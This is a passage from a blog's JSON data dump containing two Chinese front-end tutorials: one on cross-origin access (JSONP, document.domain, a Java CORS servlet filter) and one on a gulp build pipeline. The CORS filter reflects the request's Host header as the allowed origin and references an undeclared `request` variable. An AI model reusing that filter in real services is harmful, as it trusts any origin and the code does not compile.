class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>yourcallback</code>就是你定义的相应函数。通过jsonp的方式访问跨域的api有很多弊端，比如</p>\n<ul>\n<li>只能发起get请求，无法post数据</li>\n<li>执行上下文只能是global(如果你要通过callback参数传递一串context我也无异议)</li>\n</ul>\n<p>这是通过前端的办法（其实也有后端的配合）解决跨域api访问的限制。</p>\n<h4><span id=\"解决iframe与父页面或顶层页面的通信opener同理\">解决iframe与父页面或顶层页面的通信(opener同理)</span></h4>\n<p>iframe与父页面之间的通信只能是根域名完全相同才行，比如：</p>\n<ul>\n<li><a href=\"http://iframe.xn--coma-221g.iframe.com\" target=\"_blank\" rel=\"noopener\">iframe.com和a.iframe.com</a></li>\n<li><a href=\"http://a.iframe.xn--comb-221g.iframe.com\" target=\"_blank\" rel=\"noopener\">a.iframe.com和b.iframe.com</a></li>\n<li><a href=\"http://iframe.xn--comiframe-sw9o.com:8080\" target=\"_blank\" rel=\"noopener\">iframe.com和iframe.com:8080</a></li>\n</ul>\n<p>如果根域名不同是无法通过常规手段进行通信的比如：</p>\n<ul>\n<li><a href=\"http://a.xn--comb-nb5f.com\" target=\"_blank\" rel=\"noopener\">a.com与b.com</a>（包括二级三级域名）</li>\n<li><a href=\"http://1.1.1.xn--1a-2v2c.com\" target=\"_blank\" rel=\"noopener\">1.1.1.1与a.com</a></li>\n</ul>\n<p>要解决同根域名之间的跨域（如获取子/父页面的dom、属性、方法）其实很简单，只需要将它们的domain都设置成根域名就好了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a.iframe.com下面的脚本</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'iframe.com'</span>;</span><br><span class=\"line\"><span class=\"comment\">// b.iframe.com下面的脚本（iframe或opener）</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'iframe.com'</span>;</span><br></pre></td></tr></table></figure>\n<p>这样，同根域名页面之间的跨域问题便解决了，可以自由操纵dom，自由读写属性和方法</p>\n<h3><span id=\"通过后端服务解决\">通过后端服务解决</span></h3>\n<p>也许你只是想解决webapi的跨域问题又拒绝使用jsonp这种感觉有点‘low’的解决方案，这时候就轮到服务端代码登场了，通过修改响应头信息来告知浏览器这个请求是否是安全可靠的。<br>\n我们知道http协议的请求头/应头都有一串键值对，<code>Origin</code>这个属性会在我们的请求头里，<code>Access-Control-Allow-Origin</code>这个属性可能会在我们的响应头里（因为在本域名请求下这个属性有没有都无所谓），这就是我们能成功实现跨域接口访问的关键。当服务器端在<code>ccess-Control-Allow-Origin</code>里包含了我们的<code>Origin</code>，那浏览器就发起真正的请求，接口就能正确相应，这里以java为例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里是过滤器里面的方法</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span>  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest req, ServletResponse res,  </span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;  </span><br><span class=\"line\">  HttpServletResponse response = (HttpServletResponse) res;  </span><br><span class=\"line\">  <span class=\"comment\">// 请求是什么Host，就响应什么</span></span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Origin\"</span>, request.getHeader(<span class=\"string\">\"Host\"</span>));  </span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Methods\"</span>, <span class=\"string\">\"POST, GET, OPTIONS, DELETE\"</span>);  </span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Headers\"</span>, <span class=\"string\">\"x-requested-with\"</span>);  </span><br><span class=\"line\">  chain.doFilter(req, res);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里有两点要注意</p>\n<ul>\n<li>浏览器检测到这是个跨域的请求时，会先发起一个请求方法为&quot;options&quot;的请求，所以服务端还必须得允许OPTIONS的请求类型</li>\n<li>jquery的ajax的请求头会有x-requested-with这样的字样，<code>response.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;x-requested-with&quot;)</code>这段代码依然是告诉浏览器允许这个自定义请求头<br>\n往往允许一个跨域请求还要满足以上两点才能成功，总结一下浏览器的跨域api请求流程：</li>\n</ul>\n<ol>\n<li>检测到这是一个跨域的请求（请求url的host和当前页面host不一样）;</li>\n<li>先发起一个method为OPTIONS的请求，如果服务器的响应信息<code>Access-Control-Allow-Origin</code>没有我们的host，或者不允许OPTIONS请求方法，或者不允许自定义请求头<code>x-requested-with</code>，请求停止，抛出错误。否则：</li>\n<li>再发一起一个正常的xhr请求，此时才会响应我们的逻辑回调函数</li>\n</ol>\n<p>在浏览器的开发者工具 network一栏里筛选xhr类型的请求可以清楚的看到浏览器对同一个请求发起了两次，第一次是OPTION请求，没有带上任何参数，第二次就是常规的请求</p>\n<p>以上则是博主对一些常见的跨域问题的解决方法的简单介绍，如有错误欢迎通过下方邮件指出。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>要说跨域，那得先来认识什么是跨域，以下内容摘自网络<br>\n<img src=\"20170627224652.jpg\" alt=\"跨域\"></p>\n<p>总而言之就是浏览器厂商为了web安全，使得不同域名的网页之间，无法通信，在博主的web开发历程中，主要遇到的是以下几种跨域的情况。</p>\n<ul>\n<li>web api访问时</li>\n<li>iframe与父页面或顶层页面之间资源访问时</li>\n<li>访问opener时</li>\n</ul>\n<p>一般解决跨域问题可以从两个维度来解决</p>\n<ul>\n<li>web前端通过一些技巧来解决</li>\n<li>后端的服务器解决</li>\n</ul>\n<h3>通过前端手段解决</h3>\n<p>通过前端来解决跨域问题是有限制的，但是能在不动后端代码的前提下已经能解决大部分的跨域问题了</p>\n<h4>解决web api的访问限制</h4>\n<p>这种情况不少，因为开发模式的问题（比如你接的前端私活，给你提供了接口挂在外网，但是没有给你后端的源码，你无法启动一个本地服务来开发），或者你使用的是别人的服务（如一些实时天气数据接口），都会遇到跨域问题。因为服务器一般情况下并不会相应一个非本域名下的请求，这也是出于安全的考虑。但是我们可以通过jsonp来解决这个问题。<br>\n我们都知道script标签可以引用来自任何域名下的js脚本文件（不存在的网站除外，你懂的），于是我们就可以通过这个特性来实现跨域访问一些api<br>\n比如有一个请求是这样的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://example.com/getData</span><br></pre></td></tr></table></figure>\n<p>而我们的线上环境是http://mydomain.com，如果我们直接用<code>XmlHttpRequest</code>构造方法去发起这个请求，浏览器必定会抛出跨域的错误从而无法达到我们的预期，但是如果我们以这样的方式去请求这个接口</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://example.com/getData\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>你会说，这样就行了？ 慢着，这只是第一步，jsonp是需要通过后端的配合才能完成的。后端在此时的输出应该是一个执行的函数，实参是你要拿到的数据比如php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里只是一个例子，可能浏览器端不会执</span></span><br><span class=\"line\"><span class=\"comment\">// 因为浏览器可能认为这只是一个字符串，具体的还请使用各个语言的特性使其输出为一个对象</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'callback(&#123;\"data\": \"hello world!\"&#125;)'</span>;</span><br></pre></td></tr></table></figure>\n<p>当这个“资源文件”请求完成后，js引擎便会执行这段脚本，从全局环境寻找<code>callback</code>这个函数，于是如果你事先定义了这个函数，如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.callback = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log( data );</span><br><span class=\"line\">  <span class=\"comment\">// DO STH...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>控制台便会输出服务端返回的<code>data</code>，但是一般情况下不会这样去请求一个jsonp类型的接口，往往是动态生成一个script标签写入到页面响应后再移除，并且具体响应的函数通过参数的形式传到后台，比如</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://example.com/getData?callback=yourcallback\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>yourcallback</code>就是你定义的相应函数。通过jsonp的方式访问跨域的api有很多弊端，比如</p>\n<ul>\n<li>只能发起get请求，无法post数据</li>\n<li>执行上下文只能是global(如果你要通过callback参数传递一串context我也无异议)</li>\n</ul>\n<p>这是通过前端的办法（其实也有后端的配合）解决跨域api访问的限制。</p>\n<h4>解决iframe与父页面或顶层页面的通信(opener同理)</h4>\n<p>iframe与父页面之间的通信只能是根域名完全相同才行，比如：</p>\n<ul>\n<li><a href=\"http://iframe.xn--coma-221g.iframe.com\" target=\"_blank\" rel=\"noopener\">iframe.com和a.iframe.com</a></li>\n<li><a href=\"http://a.iframe.xn--comb-221g.iframe.com\" target=\"_blank\" rel=\"noopener\">a.iframe.com和b.iframe.com</a></li>\n<li><a href=\"http://iframe.xn--comiframe-sw9o.com:8080\" target=\"_blank\" rel=\"noopener\">iframe.com和iframe.com:8080</a></li>\n</ul>\n<p>如果根域名不同是无法通过常规手段进行通信的比如：</p>\n<ul>\n<li><a href=\"http://a.xn--comb-nb5f.com\" target=\"_blank\" rel=\"noopener\">a.com与b.com</a>（包括二级三级域名）</li>\n<li><a href=\"http://1.1.1.xn--1a-2v2c.com\" target=\"_blank\" rel=\"noopener\">1.1.1.1与a.com</a></li>\n</ul>\n<p>要解决同根域名之间的跨域（如获取子/父页面的dom、属性、方法）其实很简单，只需要将它们的domain都设置成根域名就好了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a.iframe.com下面的脚本</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'iframe.com'</span>;</span><br><span class=\"line\"><span class=\"comment\">// b.iframe.com下面的脚本（iframe或opener）</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'iframe.com'</span>;</span><br></pre></td></tr></table></figure>\n<p>这样，同根域名页面之间的跨域问题便解决了，可以自由操纵dom，自由读写属性和方法</p>\n<h3>通过后端服务解决</h3>\n<p>也许你只是想解决webapi的跨域问题又拒绝使用jsonp这种感觉有点‘low’的解决方案，这时候就轮到服务端代码登场了，通过修改响应头信息来告知浏览器这个请求是否是安全可靠的。<br>\n我们知道http协议的请求头/应头都有一串键值对，<code>Origin</code>这个属性会在我们的请求头里，<code>Access-Control-Allow-Origin</code>这个属性可能会在我们的响应头里（因为在本域名请求下这个属性有没有都无所谓），这就是我们能成功实现跨域接口访问的关键。当服务器端在<code>ccess-Control-Allow-Origin</code>里包含了我们的<code>Origin</code>，那浏览器就发起真正的请求，接口就能正确相应，这里以java为例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里是过滤器里面的方法</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span>  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest req, ServletResponse res,  </span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;  </span><br><span class=\"line\">  HttpServletResponse response = (HttpServletResponse) res;  </span><br><span class=\"line\">  <span class=\"comment\">// 请求是什么Host，就响应什么</span></span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Origin\"</span>, request.getHeader(<span class=\"string\">\"Host\"</span>));  </span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Methods\"</span>, <span class=\"string\">\"POST, GET, OPTIONS, DELETE\"</span>);  </span><br><span class=\"line\">  response.setHeader(<span class=\"string\">\"Access-Control-Allow-Headers\"</span>, <span class=\"string\">\"x-requested-with\"</span>);  </span><br><span class=\"line\">  chain.doFilter(req, res);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里有两点要注意</p>\n<ul>\n<li>浏览器检测到这是个跨域的请求时，会先发起一个请求方法为&quot;options&quot;的请求，所以服务端还必须得允许OPTIONS的请求类型</li>\n<li>jquery的ajax的请求头会有x-requested-with这样的字样，<code>response.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;x-requested-with&quot;)</code>这段代码依然是告诉浏览器允许这个自定义请求头<br>\n往往允许一个跨域请求还要满足以上两点才能成功，总结一下浏览器的跨域api请求流程：</li>\n</ul>\n<ol>\n<li>检测到这是一个跨域的请求（请求url的host和当前页面host不一样）;</li>\n<li>先发起一个method为OPTIONS的请求，如果服务器的响应信息<code>Access-Control-Allow-Origin</code>没有我们的host，或者不允许OPTIONS请求方法，或者不允许自定义请求头<code>x-requested-with</code>，请求停止，抛出错误。否则：</li>\n<li>再发一起一个正常的xhr请求，此时才会响应我们的逻辑回调函数</li>\n</ol>\n<p>在浏览器的开发者工具 network一栏里筛选xhr类型的请求可以清楚的看到浏览器对同一个请求发起了两次，第一次是OPTION请求，没有带上任何参数，第二次就是常规的请求</p>\n<p>以上则是博主对一些常见的跨域问题的解决方法的简单介绍，如有错误欢迎通过下方邮件指出。</p>\n"},{"title":"使用gulp来管理我们“身不由己”的项目代码","catalog":true,"date":"2017-11-09T15:59:49.000Z","subtitle":"gulp似乎退居二线了","header-img":"post/IMG_3090.JPG","_content":"\n想当年，呸。。。 也就几年前吧，根本不知道代码还能压缩这回事，原来压缩是为了减少文件体积，提高载入速度，降低服务器压力，原来变量混淆是为了代码不被随便盗走修改（可能有那么点点这个用？）开始接触前端后，认识到了有`grunt`这种东西，当时觉得好流弊，原来前端也能自动化了，再往后看哪时的新星`gulp`已经出来，据说是因为gulp更简单，代码易懂也清晰，管道操作非常的简单明了，于是就成了后起之秀。再后来我接触到了`webpack`一切皆模块的思想又一次革命，gulp又似乎GG了，不过，不是所有的项目都采用了规范的模块化开发思路，好多项目都还是处于手写script标签来引入js的状态，所以这里说“身不由己”。但是这个时候代码压缩、缓存问题将导致多余的工作。所以gulp的引入还是蛮重要的，于是我们今天就来讲讲，如何打包`html js css`都独立的网页\n\n大概目录应该是这样的\n```\n├─build\n└─src\n    ├─css\n    ├─html\n    ├─img\n    └─js\n```\n\n根据情况不同每个工程可能还有其他的目录，这里就不添加了使用gulp需要用到`gulp`命令，当然你也可以安装在当前目录进入`node_modules/gulp`下去运行，全局安装gulp\n```shell\nnpm install gulp -g\n```\n项目本身会依赖到`gulp,gulp-autoprefixer,gulp-clean-css,gulp-uglify,gulp-rev-all,gulp-html-minify,gulp-useref`，东西有点多，每个包都有它的作用哦，下面我们就开始写代码来打包我们的代码\n\n```js\n// gulpfile.js\nconst revAll = require( 'gulp-rev-all' )\nconst useref = require( 'gulp-useref' )\nconst minifyCss = require( 'gulp-clean-css' )\nconst filter = require( 'gulp-filter' )\nconst htmlmini = require( 'gulp-html-minify' )\nconst base64 = require( 'gulp-base64' )\n\ngulp.task( 'build', function() {\n  var jsFilter = filter( '**/*.js', { restore: true } ),\n    cssFilter = filter( '**/*.css', { restore: true } ),\n    htmlFilter = filter( [ '**/*.html' ], { restore: true } )\n\n  gulp.src( [ htmlSrc, `./src/html/**/*.html` ] )\n    .pipe( useref( {\n      noconcat: true\n    } ) ) // 解析html中的构建块\n    .pipe( jsFilter ) // 过滤所有js\n    .pipe( uglify() ) // 压缩js\n    .pipe( jsFilter.restore )\n    .pipe( cssFilter ) // 过滤所有css\n    .pipe( minifyCss() ) // 压缩优化css\n    .pipe( base64( {\n      maxImageSize: 20 * 1024,\n      baseDir: './src',\n      extensions: [ 'jpg', 'png' ],\n    } ) )\n    .pipe( cssFilter.restore )\n    .pipe( revAll.revision( { // 生成版本号\n      dontRenameFile: [ '.html' ], // 不给 html 文件添加版本号\n      dontUpdateReference: [ '.html' ] // 不给文件里链接的html加版本号\n    } ) )\n    .pipe( htmlFilter ) // 过滤所有html\n    .pipe( htmlmini() ) // 压缩html\n    .pipe( htmlFilter.restore )\n    .pipe( gulp.dest( 'build' ) )\n} )\n```\n其实这里最重要的就是`useref`这个模块，这个模块能静态分析出html里依赖的js和css文件然后进行打包处理，所以只要路径正确，这里就非常的智能，直接给文件做了`hash`指纹处理，只有更新过的文件才会被重命名，这样在html更新后就能准确的通知客户端更新，而不被缓存困扰。\n我们在这里还引入了`gulp-base64`这个包是为了对一些小图片进行打包处理，减少客户端的请求以提高性能\n\n基于gulp的流处理方式，我们还可以引入`less`文件处理，`babel`转译器等插件，这里就不详述了\n\n当然gulp能干的不仅仅是这些，因为webpack从项目本身来说只能服务当前的项目，当多个不同的项目需要管理时就需要用到gulp + webpack的方式来管理。","source":"_posts/gulp.md","raw":"---\ntitle: 使用gulp来管理我们“身不由己”的项目代码\ncatalog: true\ndate: 2017-11-09 23:59:49\nsubtitle: gulp似乎退居二线了\nheader-img: post/IMG_3090.JPG\ntags:\n- gulp\n---\n\n想当年，呸。。。 也就几年前吧，根本不知道代码还能压缩这回事，原来压缩是为了减少文件体积，提高载入速度，降低服务器压力，原来变量混淆是为了代码不被随便盗走修改（可能有那么点点这个用？）开始接触前端后，认识到了有`grunt`这种东西，当时觉得好流弊，原来前端也能自动化了，再往后看哪时的新星`gulp`已经出来，据说是因为gulp更简单，代码易懂也清晰，管道操作非常的简单明了，于是就成了后起之秀。再后来我接触到了`webpack`一切皆模块的思想又一次革命，gulp又似乎GG了，不过，不是所有的项目都采用了规范的模块化开发思路，好多项目都还是处于手写script标签来引入js的状态，所以这里说“身不由己”。但是这个时候代码压缩、缓存问题将导致多余的工作。所以gulp的引入还是蛮重要的，于是我们今天就来讲讲，如何打包`html js css`都独立的网页\n\n大概目录应该是这样的\n```\n├─build\n└─src\n    ├─css\n    ├─html\n    ├─img\n    └─js\n```\n\n根据情况不同每个工程可能还有其他的目录，这里就不添加了使用gulp需要用到`gulp`命令，当然你也可以安装在当前目录进入`node_modules/gulp`下去运行，全局安装gulp\n```shell\nnpm install gulp -g\n```\n项目本身会依赖到`gulp,gulp-autoprefixer,gulp-clean-css,gulp-uglify,gulp-rev-all,gulp-html-minify,gulp-useref`，东西有点多，每个包都有它的作用哦，下面我们就开始写代码来打包我们的代码\n\n```js\n// gulpfile.js\nconst revAll = require( 'gulp-rev-all' )\nconst useref = require( 'gulp-useref' )\nconst minifyCss = require( 'gulp-clean-css' )\nconst filter = require( 'gulp-filter' )\nconst htmlmini = require( 'gulp-html-minify' )\nconst base64 = require( 'gulp-base64' )\n\ngulp.task( 'build', function() {\n  var jsFilter = filter( '**/*.js', { restore: true } ),\n    cssFilter = filter( '**/*.css', { restore: true } ),\n    htmlFilter = filter( [ '**/*.html' ], { restore: true } )\n\n  gulp.src( [ htmlSrc, `./src/html/**/*.html` ] )\n    .pipe( useref( {\n      noconcat: true\n    } ) ) // 解析html中的构建块\n    .pipe( jsFilter ) // 过滤所有js\n    .pipe( uglify() ) // 压缩js\n    .pipe( jsFilter.restore )\n    .pipe( cssFilter ) // 过滤所有css\n    .pipe( minifyCss() ) // 压缩优化css\n    .pipe( base64( {\n      maxImageSize: 20 * 1024,\n      baseDir: './src',\n      extensions: [ 'jpg', 'png' ],\n    } ) )\n    .pipe( cssFilter.restore )\n    .pipe( revAll.revision( { // 生成版本号\n      dontRenameFile: [ '.html' ], // 不给 html 文件添加版本号\n      dontUpdateReference: [ '.html' ] // 不给文件里链接的html加版本号\n    } ) )\n    .pipe( htmlFilter ) // 过滤所有html\n    .pipe( htmlmini() ) // 压缩html\n    .pipe( htmlFilter.restore )\n    .pipe( gulp.dest( 'build' ) )\n} )\n```\n其实这里最重要的就是`useref`这个模块，这个模块能静态分析出html里依赖的js和css文件然后进行打包处理，所以只要路径正确，这里就非常的智能，直接给文件做了`hash`指纹处理，只有更新过的文件才会被重命名，这样在html更新后就能准确的通知客户端更新，而不被缓存困扰。\n我们在这里还引入了`gulp-base64`这个包是为了对一些小图片进行打包处理，减少客户端的请求以提高性能\n\n基于gulp的流处理方式，我们还可以引入`less`文件处理，`babel`转译器等插件，这里就不详述了\n\n当然gulp能干的不仅仅是这些，因为webpack从项目本身来说只能服务当前的项目，当多个不同的项目需要管理时就需要用到gulp + webpack的方式来管理。","slug":"gulp","published":1,"updated":"2017-11-10T05:37:37.397Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl000ei4ucaln5wuqy","content":"<p>想当年，呸。。。 也就几年前吧，根本不知道代码还能压缩这回事，原来压缩是为了减少文件体积，提高载入速度，降低服务器压力，原来变量混淆是为了代码不被随便盗走修改（可能有那么点点这个用？）开始接触前端后，认识到了有<code>grunt</code>这种东西，当时觉得好流弊，原来前端也能自动化了，再往后看哪时的新星<code>gulp</code>已经出来，据说是因为gulp更简单，代码易懂也清晰，管道操作非常的简单明了，于是就成了后起之秀。再后来我接触到了<code>webpack</code>一切皆模块的思想又一次革命，gulp又似乎GG了，不过，不是所有的项目都采用了规范的模块化开发思路，好多项目都还是处于手写script标签来引入js的状态，所以这里说“身不由己”。但是这个时候代码压缩、缓存问题将导致多余的工作。所以gulp的引入还是蛮重要的，于是我们今天就来讲讲，如何打包<code>html js css</code>都独立的网页</p>\n<p>大概目录应该是这样的</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├─build</span><br><span class=\"line\">└─src</span><br><span class=\"line\">    ├─css</span><br><span class=\"line\">    ├─html</span><br><span class=\"line\">    ├─img</span><br><span class=\"line\">    └─js</span><br></pre></td></tr></table></figure>\n<p>根据情况不同每个工程可能还有其他的目录，这里就不添加了使用gulp需要用到<code>gulp</code>命令，当然你也可以安装在当前目录进入<code>node_modules/gulp</code>下去运行，全局安装gulp</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install gulp -g</span><br></pre></td></tr></table></figure>\n<p>项目本身会依赖到<code>gulp,gulp-autoprefixer,gulp-clean-css,gulp-uglify,gulp-rev-all,gulp-html-minify,gulp-useref</code>，东西有点多，每个包都有它的作用哦，下面我们就开始写代码来打包我们的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// gulpfile.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> revAll = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-rev-all'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> useref = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-useref'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> minifyCss = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-clean-css'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> filter = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-filter'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> htmlmini = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-html-minify'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> base64 = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-base64'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">gulp.task( <span class=\"string\">'build'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> jsFilter = filter( <span class=\"string\">'**/*.js'</span>, &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; ),</span><br><span class=\"line\">    cssFilter = filter( <span class=\"string\">'**/*.css'</span>, &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; ),</span><br><span class=\"line\">    htmlFilter = filter( [ <span class=\"string\">'**/*.html'</span> ], &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\">  gulp.src( [ htmlSrc, <span class=\"string\">`./src/html/**/*.html`</span> ] )</span><br><span class=\"line\">    .pipe( useref( &#123;</span><br><span class=\"line\">      noconcat: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125; ) ) <span class=\"comment\">// 解析html中的构建块</span></span><br><span class=\"line\">    .pipe( jsFilter ) <span class=\"comment\">// 过滤所有js</span></span><br><span class=\"line\">    .pipe( uglify() ) <span class=\"comment\">// 压缩js</span></span><br><span class=\"line\">    .pipe( jsFilter.restore )</span><br><span class=\"line\">    .pipe( cssFilter ) <span class=\"comment\">// 过滤所有css</span></span><br><span class=\"line\">    .pipe( minifyCss() ) <span class=\"comment\">// 压缩优化css</span></span><br><span class=\"line\">    .pipe( base64( &#123;</span><br><span class=\"line\">      maxImageSize: <span class=\"number\">20</span> * <span class=\"number\">1024</span>,</span><br><span class=\"line\">      baseDir: <span class=\"string\">'./src'</span>,</span><br><span class=\"line\">      extensions: [ <span class=\"string\">'jpg'</span>, <span class=\"string\">'png'</span> ],</span><br><span class=\"line\">    &#125; ) )</span><br><span class=\"line\">    .pipe( cssFilter.restore )</span><br><span class=\"line\">    .pipe( revAll.revision( &#123; <span class=\"comment\">// 生成版本号</span></span><br><span class=\"line\">      dontRenameFile: [ <span class=\"string\">'.html'</span> ], <span class=\"comment\">// 不给 html 文件添加版本号</span></span><br><span class=\"line\">      dontUpdateReference: [ <span class=\"string\">'.html'</span> ] <span class=\"comment\">// 不给文件里链接的html加版本号</span></span><br><span class=\"line\">    &#125; ) )</span><br><span class=\"line\">    .pipe( htmlFilter ) <span class=\"comment\">// 过滤所有html</span></span><br><span class=\"line\">    .pipe( htmlmini() ) <span class=\"comment\">// 压缩html</span></span><br><span class=\"line\">    .pipe( htmlFilter.restore )</span><br><span class=\"line\">    .pipe( gulp.dest( <span class=\"string\">'build'</span> ) )</span><br><span class=\"line\">&#125; 